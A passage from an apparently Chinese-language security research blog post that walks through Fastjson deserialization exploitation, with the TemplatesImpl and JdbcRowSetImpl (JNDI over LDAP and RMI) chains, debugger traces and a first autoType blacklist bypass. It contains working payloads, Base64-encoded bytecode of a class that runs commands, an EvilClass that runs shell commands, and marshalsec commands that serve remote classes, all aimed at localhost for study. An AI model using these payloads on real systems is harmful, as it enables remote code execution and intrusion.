            <span class="token class-name">String</span> text1 <span class="token operator">=</span> <span class="token string">"{\"@type\":\""</span> <span class="token operator">+</span> NASTY_CLASS <span class="token operator">+</span>
                    <span class="token string">"\",\"_bytecodes\":[\""</span><span class="token operator">+</span>evilCode<span class="token operator">+</span><span class="token string">"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ },"</span> <span class="token operator">+</span>
                    <span class="token string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n"</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text1<span class="token punctuation">)</span><span class="token punctuation">;</span>

            JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text1<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出的POC：</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADMAMgoABwAkCgAlACYIACcKACUAKAcAKQoABQAkBwAqAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACFMVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzczsBAApFeGNlcHRpb25zBwArAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQBAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcALQwALgAvAQAEY2FsYwwAMAAxAQAfVGVtcGxhdGVzSW1wbF9FeHBsb2l0L0V2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAAAwABAANAA0ADgAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABEADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAPAAAABAABABcAAQARABgAAgAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABUADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAZABoAAgAAAAEAGwAcAAMADwAAAAQAAQAXAAkAHQAeAAIACgAAAEEAAgACAAAACbsABVm3AAZMsQAAAAIACwAAAAoAAgAAABgACAAZAAwAAAAWAAIAAAAJAB8AIAAAAAgAAQAhAA4AAQAPAAAABAABABAAAQAiAAAAAgAj"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>'_name'<span class="token operator">:</span>'a.b'<span class="token punctuation">,</span>'_tfactory'<span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token property">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token property">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>关键点解释：</p>
<ul>
<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>是那个带有危险操作的类；</li>
<li>经过base64编码的payload会经过私有属性<code>_bytecodes</code>传递给<code>_outputProperties</code>函数，从而导致命令执行；</li>
<li>另外，在<code>defineTransletClasses()</code>时会调用<code>getExternalExtensionsMap()</code>，当为null时会报错，所以要对<code>_tfactory</code>设置，这一点后面调试分析会说到。</li>
</ul>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175654367.png"></p>
<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>以终为始，断点下在<code>EvilClass.java</code>的危险操作代码行</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175826238.png" style="zoom:80%;">

<p>完整调用链如下图</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175954700.png" style="zoom:90%;">

<p>为了调试分析，在入口<code>JSON.parseObject()</code>下个断点，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180157152.png"></p>
<p>然后到<code>DefaultJSONParser</code>对象的<code>parseObject()</code>方法，继续进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180415783.png"></p>
<p>接着调用了<code>ObjectDeserializer</code>的<code>deserialze()</code>方法，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180611353.png"></p>
<p>然后判断调用<code>DefaultJSONParser</code>的<code>parseObject()</code>方法还是<code>parse()</code>方法，最终调用<code>DefaultJSONParser.parse()</code>方法</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130180822913.png"></p>
<p>在<code>DefaultJSONParser.parse()</code>里对JSON内容进行扫描，在switch语句中匹配上了<code>{</code>即对应12，调用<code>DefaultJSONParser.parseObject()</code>进行解析，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181152169.png"></p>
<p>接着就是在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>里循环解析json中的内容，其中<code>skipWhitespace()</code>函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用<code>scanSymbol()</code>获取双引号内的内容，这里得到第一个双引号里的内容为<code>@type</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181334866.png"></p>
<p>往下调试，判断key是否为<code>@type</code>且是否关闭了<code>Feature.DisableSpecialKeyDetect</code>设置，通过判断后调用<code>scanSymbol()</code>获取到了<code>@type</code>对应的指定类com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl并调用<code>TypeUtils.loadClass()</code>函数加载该类，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181515630.png"></p>
<p>看到红框的两个判断语句代码逻辑，是判断当前类名是否<strong>以<code>[</code>开头</strong>或<strong>以<code>L</code>开头以<code>;</code>结尾</strong>，当然本次调试分析是不会进入到这两个逻辑，但是<strong>这两个判断逻辑为后面的补丁绕过提供了思路</strong>，值得注意。</p>
<p>接着通过<code>classLoader.loadClass()</code>加载到目标类后，将该类名和类缓存到Map中，最后返回该加载的类。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181741056.png"></p>
<p>返回后继续接着<code>TypeUtils.loadClass()</code>往下执行，然后调用<code>deserializer.deserialze()</code>对<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>进行反序列化，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130181901649.png"></p>
<p>执行来到for循环，循环扫描解析</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182150090.png"></p>
<p><code>fieldIndex</code>值为3时，会调用<code>parseField()</code>继续执行，此时解析到 key 值为<code>_bytecodes</code>，进入<code>parseField()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182437049.png"></p>
<p>会调用<code>fieldDeserializer.parseField()</code>对<code>_bytecodes</code>的值进一步解析，进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182639502.png"></p>
<p>接着，会解析出<code>_bytecodes</code>对应的内容，然后调用<code>setValue()</code>函数设置对应的值，这里value即为恶意类二进制内容Base64解码后的数据，解码过程发生在<code>setValue()</code>前面的<code>fieldValueDeserilizer.deserialze()</code>函数。因为有解码，所以在构造POC的时候，我们也进行了Base64编码。进入<code>setValue()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182850116.png"></p>
<p>进入后可以看到，调用了<code>private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes</code>的<code>set()</code>方法来设置<code>_bytecodes</code>的值：</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130182952042.png"></p>
<p>然后回到for循环遍历JSON数据中的其它键值对并赋值，下面是<code>_name</code>赋值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183154373.png"></p>
<p>给<code>_tfactory</code>赋值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183306826.png"></p>
<p>然后来到了我们的关键函数<code>outputProperties</code>，进入<code>setValue()</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183410580.png"></p>
<p>下图可以看到，会通过反射机制调用<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>方法，下划线跑去哪了？在经过<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code>函数时，会把下划线去掉。</p>
<p><code>getOutputProperties()</code>方法类型是<code>Properties</code>，满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的<code>getter</code>方法，继续跟进，这里需要选择强制进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183521907.png"></p>
<p>然后调用了<code>MethodAccessor.invoke(obj, args)</code>，继续强制进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183804174.png"></p>
<p>继续强制进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183833536.png"></p>
<p>继续强制进入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130183909869.png"></p>
<p>在<code>getOutputProperties()</code>方法中调用了<code>newTransformer().getOutputProperties()</code>方法，跟进<code>newTransformer()</code>方法：</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184004866.png" style="zoom:80%;">

<p>然后跟进<code>getTransletInstance()</code>方法</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184116972.png"></p>
<p>在<code>defineTransletClasses()</code>方法中，会根据<code>_bytecodes</code>的值生成<code>EvilClass</code>类</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184220452.png"></p>
<p>跟进<code>defineTransletClasses()</code>函数看看，发现会调用<code>_tfactory.getExternalExtensionsMap()</code>函数，因此我们的json数据中有<code>_tfactory</code>这个参数，否则为null会导致报错</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129115507245.png"></p>
<p>继续看<code>defineTransletClasses()</code>函数，该函数还会判断恶意类是否继承了<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，否则会报错。所以<code>EvilClass</code>类的代码中继承了<code>AbstractTranslet</code>。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231129122117742.png"></p>
<p>可以看到最终解析到<code>class TemplatesImpl_Exploit.EvilClass</code>类了：</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130184738079.png"></p>
<p>后面就是EvilClass类的实例化过程，过程中会调用构造函数，并弹出计算器</p>
<p>最后的调用过滤再具体说下：在<code>getTransletInstance()</code>函数中调用了<code>defineTransletClasses()</code>函数，在<code>defineTransletClasses()</code>函数中会根据<code>_bytecodes</code>来生成一个Java类（这里为恶意类<code>EvilClass</code>），该类构造方法中含有命令执行代码，生成的Java类随后会被<code>newInstance()</code>方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。</p>
<h3 id="基于JdbcRowSetImpl的利用链"><a href="#基于JdbcRowSetImpl的利用链" class="headerlink" title="基于JdbcRowSetImpl的利用链"></a>基于<code>JdbcRowSetImpl</code>的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即<code>JNDI+RMI</code>和<code>JNDI+LDAP</code>，都是属于基于<code>Bean Property</code>类型的JNDI的利用方式。</p>
<h4 id="限制条件-1"><a href="#限制条件-1" class="headerlink" title="限制条件"></a>限制条件</h4><p>由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。</p>
<p>基于RMI利用的JDK版本&lt;=6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;=6u211、7u201、8u191</p>
<p>笔者此处用的是7u76</p>
<h4 id="JNDI-LDAP复现"><a href="#JNDI-LDAP复现" class="headerlink" title="JNDI+LDAP复现"></a>JNDI+LDAP复现</h4><p>新建一个类<code>JdbcRowSetImpl_EXP.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">JdbcRowSetImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImpl_EXP</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/EvilClass\", \"autoCommit\":true}"</span><span class="token punctuation">;</span>
        JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>另外新建一个 Maven 项目，jdk 选择 7u76，其它什么都不用动，然后新建一个类<code>EvilClass.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cmds <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span>
                    <span class="token operator">?</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c"</span><span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">}</span>
                    <span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span> <span class="token string">"touch /tmp/hacked"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">EvilClass</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行<code>EvilClass.java</code>，会在<code>target\classes\</code>生成<code>EvilClass.class</code>文件，在此目录开启一个http服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084122598.png"></p>
<p>然后利用反序列化工具<code>marshalsec</code>，开一个LDAP服务</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>运行<code>JdbcRowSetImpl_EXP.java</code>，成功弹出计算器，有报错但不影响</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084522702.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201084811872.png"></p>
<h4 id="JNDI-RMI复现"><a href="#JNDI-RMI复现" class="headerlink" title="JNDI+RMI复现"></a>JNDI+RMI复现</h4><p>修改<code>JdbcRowSetImpl_EXP.java</code>的payload中<code>dataSourceName</code>值为<code>rmi://127.0.0.1:1099/EvilClass</code></p>
<p>用marshalsec开启一个RMI服务</p>
<pre class="line-numbers language-none"><code class="language-none">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://127.0.0.1:9898/#EvilClass"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085349761.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201085726778.png"></p>
<h4 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h4><p>以RMI为例，断点下在<code>JSON.parse(payload);</code>，前面是类似的，直奔主题</p>
<p>在<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>处会对payload的json数据进行循环遍历，可以看到此时已经解析到<code>com.sun.rowset.JdbcRowSetImpl</code>类了，继续运行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095253335.png"></p>
<p>接着对<code>JdbcRowSetImpl</code>进行反序列化</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201095607620.png"></p>
<p>接下来有些地方通过ASM机制在运行，不太好调试了，我们提前在<code>com.sun.rowset.JdbcRowSetImpl</code>下面两处打好断点等它过来</p>
<pre class="line-numbers language-none"><code class="language-none">com.sun.rowset.JdbcRowSetImpl#setDataSourceName
com.sun.rowset.JdbcRowSetImpl#setAutoCommit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>首先来到了<code>setDataSourceName()</code>函数处，将<code>dataSource</code>设置成了<code>rmi://127.0.0.1:1099/EvilClass</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201102613671.png"></p>
<p>接着再来到<code>setAutoCommit()</code>函数，这里跟进<code>connect()</code>函数</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103025720.png"></p>
<p>跟进后发现JNDI的熟悉的注入代码<code>InitialContext.lookup()</code>方法，其参数<code>this.getDataSourceName()</code>会获得RMI链接，从而导致JNDI注入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201103325953.png"></p>
<h3 id="补丁与绕过"><a href="#补丁与绕过" class="headerlink" title="补丁与绕过"></a>补丁与绕过</h3><h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>修改一下pom.xml，把fastjson版本修改为<code>1.2.41</code>，然后重新加载</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.41<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行<code>JdbcRowSetImpl_EXP.java</code>，发现报错，提示autoType禁用了<code>com.sun.rowset.JdbcRowSetImpl</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201104752314.png"></p>
<p>调试，前面步骤差不多，我们直奔主题<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code>，debug到该函数下，发现多了个函数<code>checkAutoType()</code>，跟进</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105217776.png"></p>
<p>可以看出来<code>checkAutoType()</code>函数增加了黑白名单，acceptList为白名单，denyList为黑名单。低版本Fastjson白名单需要自己设置，默认为空；黑名单有如下图的23组，前面分析的两条利用链<code>com.sun.</code>被包含在了第3组。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201105502189.png"></p>
<p>该函数还引入了一个参数autoTypeSupport，默认为false：</p>
<p>当<strong>autoTypeSupport为true</strong>时，先进行白名单过滤，匹配成功即可加载该类并返回；否则进行黑名单过滤，匹配成功直接报错；两者皆未匹配成功，则加载该类。<strong>宏观上相当于黑名单机制。默认放行，黑名单过滤。</strong><br>当<strong>autoTypeSupport为false</strong>时，先进行黑名单过滤，匹配成功直接报错；再匹配白名单，匹配成功即可加载该类并返回；两者皆未匹配成功，则报错。<strong>宏观上相当于白名单机制。默认拒绝，白名单放行。</strong></p>
<p>将autoTypeSupport设置为True有两种方法：</p>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
</ul>
<p>AutoType白名单设置方法：</p>
<ul>
<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(“com.xx.a”);</code></li>
<li>通过<code>fastjson.properties</code>文件配置。在1.2.25/1.2.26版本支持通过类路径的<code>fastjson.properties</code>文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
</ul>
<p>继续调试，就会由于在<code>checkAutoType()</code>函数中未开启autoTypeSupport，即默认设置false的场景下被黑名单过滤了，从而导致抛出异常</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201112624676.png"></p>
<h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><p>注意：以下payload都是<strong>需要AutoTypeSupport为true</strong>才能成功利用的</p>
<h5 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h5><p>先上payload，该payload适用于1.2.25-1.2.41</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"Lcom.sun.rowset.JdbcRowSetImpl;"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/EvilClass"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>通过前面分析我们知道，虽然<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>不在黑名单里面，但是当autoTypeSupport为false时，在黑白名单都无法匹配的情况下也是报错的。</p>
<p>下面我们用<code>JdbcRowSetImpl</code>利用链的代码调试一下，注意需要开启AutoTypeSupport，添加以下代码即可：</p>
<pre class="line-numbers language-none"><code class="language-none">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于绕过了校验，往下会执行<code>TypeUtils.loadClass(typeName, this.defaultClassLoader, false)</code>，跟进</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231201114011112.png"></p>
